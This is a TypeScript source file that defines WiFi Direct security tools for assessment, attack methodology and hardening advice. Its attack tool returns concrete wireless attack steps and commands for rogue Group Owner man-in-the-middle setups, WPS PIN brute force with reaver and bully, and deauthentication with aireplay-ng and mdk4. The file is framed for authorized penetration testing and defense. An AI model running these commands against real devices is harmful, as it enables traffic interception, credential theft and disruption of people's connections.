import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";

// ─── Tool 1: wifi_direct_assess ───

const wifiDirectAssess: ToolDef = {
  name: "wifi_direct_assess",
  description:
    "Assess WiFi Direct (P2P) security posture based on Group Owner intent, WPS method, and persistent group configuration. Returns vulnerabilities and risk assessment.",
  schema: {
    go_intent: z
      .number()
      .min(0)
      .max(15)
      .describe("WiFi Direct Group Owner intent value (0-15). 15 = always become GO, 0 = never become GO."),
    wps_method: z
      .enum(["pbc", "pin_display", "pin_keypad", "nfc"])
      .describe("WPS method used for WiFi Direct pairing: pbc (Push Button Connect), pin_display, pin_keypad, nfc"),
    persistent_group: z
      .boolean()
      .optional()
      .describe("Whether persistent group is enabled (devices reconnect automatically)"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const goIntent = args.go_intent as number;
    const wpsMethod = args.wps_method as string;
    const persistentGroup = args.persistent_group as boolean | undefined;

    const vulnerabilities: string[] = [];
    const risks: string[] = [];
    const recommendations: string[] = [];

    // Assess GO intent
    if (goIntent >= 12) {
      vulnerabilities.push("High GO intent (device almost always becomes Group Owner) — makes it a high-value target as it runs the DHCP server and controls the group");
      risks.push("Rogue client can connect and access GO's network stack");
    }
    if (goIntent <= 3) {
      risks.push("Low GO intent — device will join groups managed by others, potentially untrusted Group Owners");
      vulnerabilities.push("Device trusts external Group Owner for DHCP, DNS, and routing — MitM risk");
    }

    // Assess WPS method
    const wpsAssessment: Record<string, { risk: string; vulnerabilities: string[]; recommendation: string }> = {
      pbc: {
        risk: "HIGH",
        vulnerabilities: [
          "Push Button Connect has no PIN verification — first device to respond wins",
          "Window-of-vulnerability: 120-second PBC window where any device can connect",
          "Attacker within range can connect during PBC window without user knowledge",
          "No way to verify the identity of the connecting device",
        ],
        recommendation: "Use PIN display or NFC instead of PBC for WiFi Direct",
      },
      pin_display: {
        risk: "MEDIUM",
        vulnerabilities: [
          "WPS PIN is 8 digits verified in two halves — 11,000 attempts to brute force",
          "PIN displayed on screen can be shoulder-surfed",
          "Known PIN brute force attacks (Reaver, Bully) apply to WiFi Direct WPS",
          "PIN does not change between sessions on some implementations",
        ],
        recommendation: "Use dynamic (per-session) PIN and implement lockout after failed attempts",
      },
      pin_keypad: {
        risk: "MEDIUM",
        vulnerabilities: [
          "Same WPS PIN brute force vulnerability as pin_display",
          "User must enter PIN — social engineering to provide PIN to wrong device",
          "Static PIN on some devices makes offline brute force possible",
        ],
        recommendation: "Enforce dynamic PINs and implement connection attempt rate limiting",
      },
      nfc: {
        risk: "LOW",
        vulnerabilities: [
          "NFC requires physical proximity (< 10cm) — reduces remote attack surface",
          "NFC relay attacks possible but require specialized equipment",
          "NFC eavesdropping possible at short range",
        ],
        recommendation: "NFC is the most secure WPS method for WiFi Direct — use when available",
      },
    };

    const wpsInfo = wpsAssessment[wpsMethod];
    vulnerabilities.push(...wpsInfo.vulnerabilities);
    recommendations.push(wpsInfo.recommendation);

    // Assess persistent group
    if (persistentGroup === true) {
      vulnerabilities.push(
        "Persistent group enabled — devices automatically reconnect without re-authentication",
        "Captured group credentials (from previous pairing) allow permanent access",
        "Stolen device with persistent group membership maintains network access",
      );
      recommendations.push(
        "Disable persistent groups in high-security environments",
        "Require re-authentication for each WiFi Direct session",
      );
    }

    // General WiFi Direct vulnerabilities
    vulnerabilities.push(
      "WiFi Direct P2P discovery frames expose device name, type, and capabilities in plaintext",
      "Group Owner runs a DHCP server — rogue GO can assign malicious DNS settings",
      "WiFi Direct operates concurrently with infrastructure WiFi — potential cross-network leakage",
      "Deauthentication attacks (802.11 deauth) can disconnect WiFi Direct sessions (unless PMF enabled)",
    );

    const overallRisk =
      wpsMethod === "pbc"
        ? "HIGH"
        : persistentGroup === true
          ? "MEDIUM-HIGH"
          : wpsMethod === "nfc"
            ? "LOW"
            : "MEDIUM";

    return json({
      assessment: {
        goIntent,
        goIntentRole: goIntent >= 8 ? "Likely Group Owner" : goIntent <= 7 ? "Likely Client" : "Negotiable",
        wpsMethod,
        wpsRisk: wpsInfo.risk,
        persistentGroup: persistentGroup ?? "unknown",
        overallRisk,
      },
      vulnerabilities,
      recommendations: [
        ...recommendations,
        "Enable 802.11w (PMF) to protect management frames",
        "Limit WiFi Direct group to known devices via MAC filtering (weak but adds friction)",
        "Disable WiFi Direct when not actively in use",
        "Use WPA2 or WPA3 for the P2P group encryption",
        "Monitor for rogue WiFi Direct groups in the environment",
      ],
      wifiDirectProtocol: {
        discoveryPhase: "Device/Service Discovery (P2P Probe Request/Response with P2P IE)",
        negotiationPhase: "GO Negotiation (3-way handshake to determine Group Owner)",
        authenticationPhase: "WPS provisioning (PBC, PIN, or NFC)",
        operationPhase: "WPA2-PSK protected group with DHCP from GO",
      },
    });
  },
};

// ─── Tool 2: wifi_direct_attack ───

const wifiDirectAttack: ToolDef = {
  name: "wifi_direct_attack",
  description:
    "WiFi Direct attack techniques including rogue Group Owner, PIN brute force, and deauth-to-reconnect attacks. Returns methodology for authorized penetration testing.",
  schema: {},
  async execute(): Promise<ToolResult> {
    return json({
      attacks: [
        {
          name: "Rogue Group Owner",
          description: "Create a rogue WiFi Direct Group Owner that impersonates a legitimate P2P device (e.g., printer, display, file share). Lure victims to connect.",
          methodology: [
            "1. Set up wpa_supplicant in P2P GO mode with GO intent 15 (always become GO)",
            "2. Configure attractive device name matching environment (e.g., 'HP-OfficeJet-P2P', 'Samsung-TV-Direct')",
            "3. Enable PBC for easy connection (or use known default PIN)",
            "4. When victim connects, act as DHCP server and assign malicious DNS",
            "5. MitM all victim traffic through rogue GO",
            "6. Capture credentials, inject content, or redirect traffic",
          ],
          commands: [
            { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 p2p_group_add persistent", description: "Create WiFi Direct group as GO" },
            { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 set device_name 'Conference-Display'", description: "Set attractive device name" },
            { tool: "hostapd", command: "hostapd p2p_go.conf", description: "Run rogue GO with custom configuration" },
            { tool: "dnsmasq", command: "dnsmasq -i p2p-wlan0-0 --dhcp-range=192.168.49.10,192.168.49.50 -d", description: "DHCP/DNS server on GO interface" },
          ],
          impact: "MitM all WiFi Direct client traffic, credential theft, DNS spoofing",
        },
        {
          name: "WPS PIN Brute Force",
          description: "Brute force the WiFi Direct WPS PIN to gain access to an established P2P group or force pairing with a target device.",
          methodology: [
            "1. Discover WiFi Direct groups: airodump-ng wlan0mon (look for DIRECT-* SSIDs)",
            "2. Identify the BSSID of the Group Owner",
            "3. Check WPS status: wash -i wlan0mon (look for WiFi Direct groups)",
            "4. Launch Reaver against the GO's WPS: reaver -i wlan0mon -b <go_bssid> -vv",
            "5. Once WPS PIN is recovered, the WPA2 PSK for the group is obtained",
            "6. Connect to the P2P group with the recovered PSK",
          ],
          commands: [
            { tool: "wash", command: "wash -i wlan0mon", description: "Discover WPS-enabled WiFi Direct groups" },
            { tool: "reaver", command: "reaver -i wlan0mon -b <go_bssid> -vv", description: "Brute force WiFi Direct WPS PIN" },
            { tool: "reaver", command: "reaver -i wlan0mon -b <go_bssid> -K", description: "Pixie Dust attack against WiFi Direct WPS" },
            { tool: "bully", command: "bully -b <go_bssid> wlan0mon", description: "Alternative WPS brute force" },
          ],
          impact: "Join existing WiFi Direct group, access shared resources, MitM group members",
        },
        {
          name: "Deauth-to-Reconnect Attack",
          description: "Deauthenticate a WiFi Direct client from the GO, then intercept the reconnection to capture WPS exchange or redirect to rogue GO.",
          methodology: [
            "1. Identify active WiFi Direct group and client connections",
            "2. Send deauthentication frames to disconnect client from GO",
            "3. Option A: Capture the WPS re-pairing exchange (if non-persistent group)",
            "4. Option B: Bring up rogue GO with same SSID before client reconnects",
            "5. Client connects to rogue GO instead of legitimate GO",
            "6. Full MitM on client traffic",
          ],
          commands: [
            { tool: "airodump-ng", command: "airodump-ng wlan0mon --essid 'DIRECT-*'", description: "Monitor WiFi Direct groups" },
            { tool: "aireplay-ng", command: "aireplay-ng -0 10 -a <go_mac> -c <client_mac> wlan0mon", description: "Deauth client from WiFi Direct GO" },
            { tool: "mdk4", command: "mdk4 wlan0mon d -B <go_mac>", description: "Sustained deauth against WiFi Direct GO" },
          ],
          impact: "Force re-pairing (capture WPS), redirect client to rogue GO, DoS",
        },
        {
          name: "P2P Service Discovery Abuse",
          description: "Exploit WiFi Direct Service Discovery to enumerate all P2P services available on nearby devices. Reveals device capabilities and potential attack surface.",
          methodology: [
            "1. Send P2P Service Discovery requests using wpa_supplicant",
            "2. Enumerate Bonjour, UPnP, and vendor-specific services",
            "3. Identify high-value targets (printers with stored documents, displays, file shares)",
            "4. Use service information to craft targeted attacks",
          ],
          commands: [
            { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 p2p_serv_disc_req 00:00:00:00:00:00 02000001", description: "Discover Bonjour services on all P2P devices" },
            { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 p2p_find", description: "Start P2P device discovery" },
            { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 p2p_peers", description: "List discovered P2P peers" },
          ],
          impact: "Information disclosure, attack surface enumeration",
        },
      ],
      legalWarning: "Unauthorized attacks against WiFi Direct devices are illegal. Ensure proper authorization for all penetration testing activities.",
    });
  },
};

// ─── Tool 3: wifi_direct_defense ───

const wifiDirectDefense: ToolDef = {
  name: "wifi_direct_defense",
  description:
    "WiFi Direct (P2P) security hardening and defense recommendations. Returns configuration guidance, monitoring strategies, and policy recommendations.",
  schema: {},
  async execute(): Promise<ToolResult> {
    return json({
      configurationHardening: [
        {
          setting: "Disable WiFi Direct when not in use",
          description: "WiFi Direct continuously broadcasts P2P discovery frames, exposing device information. Disable when not actively sharing.",
          platforms: {
            android: "Settings > WiFi > WiFi Direct > Disable",
            windows: "Device Manager > Network Adapters > WiFi Direct Virtual Adapter > Disable",
            linux: "wpa_cli p2p_stop_find && wpa_cli p2p_group_remove *",
          },
        },
        {
          setting: "Use PIN instead of PBC",
          description: "Push Button Connect allows any device to connect during the 120-second window. PIN provides at least basic authentication.",
          recommendation: "Configure WiFi Direct to use PIN display method with dynamic (per-session) PINs",
        },
        {
          setting: "Disable Persistent Groups",
          description: "Persistent groups store credentials and auto-reconnect. Disable to require re-authentication each session.",
          recommendation: "Remove persistent group entries after use: wpa_cli p2p_group_remove *",
        },
        {
          setting: "Enable PMF (802.11w)",
          description: "Protected Management Frames prevent deauthentication attacks against WiFi Direct sessions.",
          recommendation: "Set ieee80211w=2 (required) in P2P group configuration",
        },
        {
          setting: "Limit Group Owner Services",
          description: "When acting as GO, limit exposed services and disable unnecessary network features.",
          recommendation: "Configure minimal DHCP scope, disable routing/NAT on GO, limit service discovery responses",
        },
      ],
      monitoringStrategies: [
        "Scan for unauthorized WiFi Direct groups (DIRECT-* SSIDs) in your environment",
        "Monitor for deauthentication attacks targeting WiFi Direct sessions",
        "Alert on new WiFi Direct device discoveries in restricted areas",
        "Log all WiFi Direct connections and disconnections on managed devices",
        "Deploy WIDS with WiFi Direct P2P frame detection capabilities",
        "Monitor for WPS brute force attempts against WiFi Direct group owners",
      ],
      detectionCommands: [
        { tool: "airodump-ng", command: "airodump-ng wlan0mon --essid-regex '^DIRECT-'", description: "Monitor for WiFi Direct groups in the area" },
        { tool: "kismet", command: "kismet -c wlan0", description: "Wireless IDS detecting P2P groups and anomalies" },
        { tool: "wpa_cli", command: "wpa_cli -i p2p-dev-wlan0 p2p_peers", description: "List nearby WiFi Direct peers (from client perspective)" },
      ],
      policyRecommendations: [
        "Define an acceptable use policy for WiFi Direct in the organization",
        "Prohibit WiFi Direct in high-security areas (SCIFs, server rooms, executive offices)",
        "Require WiFi Direct to be disabled by default on managed devices (MDM policy)",
        "Use MDM to enforce WiFi Direct restrictions on mobile devices",
        "Include WiFi Direct in wireless security penetration testing scope",
        "Train users on WiFi Direct risks and social engineering attacks",
        "Prefer infrastructure WiFi-based sharing (AirDrop, Nearby Share via WiFi) over WiFi Direct where possible",
      ],
      alternatives: [
        {
          technology: "Infrastructure WiFi + Application Layer Sharing",
          description: "Use standard WiFi with application-level encryption (AirDrop, Nearby Share) instead of WiFi Direct",
          securityAdvantage: "Leverages enterprise WiFi security (802.1X, WPA3), centralized monitoring",
        },
        {
          technology: "Bluetooth",
          description: "Use Bluetooth for proximity-based sharing",
          securityAdvantage: "Shorter range, different attack surface, does not interfere with WiFi",
        },
        {
          technology: "Wired Connections",
          description: "USB, Ethernet, or HDMI for file transfer and display",
          securityAdvantage: "Eliminates wireless attack surface entirely",
        },
      ],
    });
  },
};

// ─── Export All WiFi Direct Tools ───

export const wifiDirectTools: ToolDef[] = [
  wifiDirectAssess,
  wifiDirectAttack,
  wifiDirectDefense,
];
